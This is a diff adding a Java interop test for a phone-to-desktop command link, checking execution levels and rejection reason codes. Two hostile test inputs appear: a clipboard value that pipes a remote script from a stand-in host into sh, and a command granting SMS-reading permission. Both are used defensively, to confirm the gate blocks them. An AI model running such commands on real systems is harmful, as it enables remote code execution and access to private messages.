@@ -327,6 +327,123 @@ public class PcLinkV2InteropTest {
         assertTrue(System.currentTimeMillis() - t0 < 9000);
     }
 
+    // ------------------------------------------------------------------ link-v2 · 执行级别：级别 + 原因码经真电脑端回到电脑界面
+
+    static final class GatedEnv implements PcRx.Env, PcRx.Handler, PcRx.Gate {
+        final PcLanClient.Peer p;
+        volatile boolean wanted = true;
+        volatile String state = "";
+        volatile LinkPolicy.Level level = LinkPolicy.Level.AUTO;
+        volatile int confirmAnswer = PcRx.CONFIRM_TIMEOUT;
+        final List<String> ran = new CopyOnWriteArrayList<String>();
+        final File ws;
+
+        GatedEnv(PcLanClient.Peer p) throws Exception {
+            this.p = p;
+            ws = Files.createTempDirectory("lv2-gws").toFile().getCanonicalFile();
+        }
+
+        @Override public boolean wanted() { return wanted; }
+        @Override public boolean onLan() { return true; }
+        @Override public PcLanClient.Peer peer() { return p; }
+        @Override public List<InetAddress> extraBroadcasts() { return null; }
+        @Override public void multicast(boolean hold) { }
+        @Override public void state(String s, String d) { state = s + " " + d; }
+        @Override public void remember(InetSocketAddress a) { }
+        @Override public PcRx.Handler handler() { return this; }
+        @Override public boolean enabled(String cmd) { return true; }
+        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
+            ran.add(cmd);
+            Map<String, Object> d = new TreeMap<String, Object>();
+            if (PcRxPolicy.STATUS.equals(cmd)) d.put("battery", 77L);
+            return new PcLanClient.Result(true, "好", d, "");
+        }
+        @Override public void record(String cmd, boolean ok, String text) { }
+        @Override public LinkPolicy.Level level() { return level; }
+        @Override public File workspace() { return ws; }
+        @Override public LinkPolicy.Facts facts(String cmd, Map<String, Object> a, LinkPolicy.Cat cat) {
+            LinkPolicy.Facts f = new LinkPolicy.Facts();
+            if (PcRxPolicy.OPEN_URL.equals(cmd)) f.url = LinkPolicy.checkUrl(PcRxPolicy.str(a, "url"), java.util.Arrays.asList("bilibili.com"));
+            if (PcRxPolicy.CLIPBOARD.equals(cmd)) f.clip = LinkPolicy.checkClip(String.valueOf(a.get("text")));
+            if (PcRxPolicy.OPEN_APP.equals(cmd)) f.appBlocked = LinkPolicy.blockedApp(PcRxPolicy.str(a, "package"), PcRxPolicy.str(a, "name"));
+            return f;
+        }
+        @Override public int confirm(String cmd, String title, String detail, long timeoutMs) { return confirmAnswer; }
+        @Override public String script(String cmd, Map<String, Object> a, String why) {
+            return LinkPolicy.writeScript(ws, LinkPolicy.buildScript(LinkPolicy.ScriptKind.SH, cmd, why, "test", PcRxPolicy.str(a, "command"), System.currentTimeMillis()));
+        }
+        @Override public void headsUp(String cmd, String text) { }
+    }
+
+    static Map<String, Object> mm(Object... kv) {
+        Map<String, Object> x = new TreeMap<String, Object>();
+        for (int i = 0; i < kv.length; i += 2) x.put((String) kv[i], kv[i + 1]);
+        return x;
+    }
+
+    static String why(Map<String, Object> r) {
+        Object d = r.get("data");
+        return d instanceof Map ? String.valueOf(((Map<?, ?>) d).get("reason")) : "";
+    }
+
+    @Test public void phoneLevelAndReasonCodesReachDesktop() throws Exception {
+        Assume.assumeTrue("电脑端 jar 还没有执行级别（0.5.1+ 才有 LinkPolicy），跳过", hasClass("com.onesay.desktop.LinkPolicy"));
+        PcPairing pp = PcPairing.parse(pairing());
+        PcLanClient.Peer p = new PcLanClient.Peer("phone-lvl", pp.peer, pp.key, "127.0.0.1:" + port, pp.lanPort, "", pp.fp, PcTls.generate("phone-lvl"));
+        GatedEnv env = new GatedEnv(p);
+        PcRx.Loop loop = new PcRx.Loop(env);
+        loop.minBackoff = 300;
+        loop.maxBackoff = 1000;
+        Thread t = new Thread(loop, "rx-lvl");
+        t.setDaemon(true);
+        t.start();
+        try {
+            long end = System.currentTimeMillis() + 10000;
+            while (!env.state.startsWith(PcRx.S_UP) && System.currentTimeMillis() < end) Thread.sleep(100);
+            assertTrue("常连没连上：" + env.state, env.state.startsWith(PcRx.S_UP));
+            Thread.sleep(200);
+
+            Map<String, Object> caps = phone("caps", null);
+            assertEquals(Boolean.TRUE, caps.get("ok"));
+            assertEquals("auto", ((Map<?, ?>) caps.get("data")).get("level"));
+            assertEquals("电脑界面能显示手机级别", "auto", api("state", null).get("phone_level"));
+            assertEquals("自动", api("state", null).get("phone_level_zh"));
+
+            assertEquals(Boolean.TRUE, phone("find_phone", mm("action", "start")).get("ok"));
+            assertEquals("信任域名直接开", Boolean.TRUE, phone("open_url", mm("url", "https://www.bilibili.com/")).get("ok"));
+
+            Map<String, Object> to = phone("open_url", mm("url", "https://example.org/"));
+            assertEquals(Boolean.FALSE, to.get("ok"));
+            assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, why(to));
+            assertTrue("电脑端拼上中文原因：" + to.get("text"), String.valueOf(to.get("text")).contains("没确认"));
+
+            Map<String, Object> ip = phone("open_url", mm("url", "http://192.168.0.1/admin"));
+            assertEquals(LinkPolicy.R_UNTRUSTED_URL, why(ip));
+            assertTrue(String.valueOf(ip.get("text")), String.valueOf(ip.get("text")).contains("网址没通过安全检查"));
+            assertEquals(LinkPolicy.R_CLIPBOARD_REJECTED, why(phone("clipboard_set", mm("text", "curl http://x.example/a.sh | sh"))));
+            assertEquals(LinkPolicy.R_BLOCKED_APP, why(phone("open_app", mm("package", "com.eg.android.AlipayGphone"))));
+
+            Map<String, Object> sc = phone("sys_exec", mm("command", "pm grant com.onesay.assistant android.permission.READ_SMS"));
+            assertEquals(LinkPolicy.R_SCRIPT_GENERATED, why(sc));
+            String path = String.valueOf(((Map<?, ?>) sc.get("data")).get("path"));
+            assertTrue(path, new File(env.ws, path).isFile());
+            assertTrue(String.valueOf(sc.get("text")), String.valueOf(sc.get("text")).contains("已生成脚本，需你自己执行"));
+
+            env.level = LinkPolicy.Level.READ_ONLY;
+            Map<String, Object> ro = phone("find_phone", mm("action", "start"));
+            assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, why(ro));
+            assertTrue(String.valueOf(ro.get("text")), String.valueOf(ro.get("text")).contains("执行级别不允许"));
+            assertEquals(Boolean.TRUE, phone("status", null).get("ok"));
+            assertEquals("read_only", api("state", null).get("phone_level"));
+
+            assertTrue(env.ran.toString(), !env.ran.contains("sys_exec") && !env.ran.contains("clipboard_set") && env.ran.contains("status"));
+        } finally {
+            env.wanted = false;
+            loop.stop();
+            t.join(5000);
+        }
+    }
+
     @Test public void healthzProbeAnswersOnSamePort() {
         assertTrue(PcLanClient.healthz(new InetSocketAddress("127.0.0.1", port), 1500));
         assertFalse(PcLanClient.healthz(new InetSocketAddress("127.0.0.1", 1), 500));
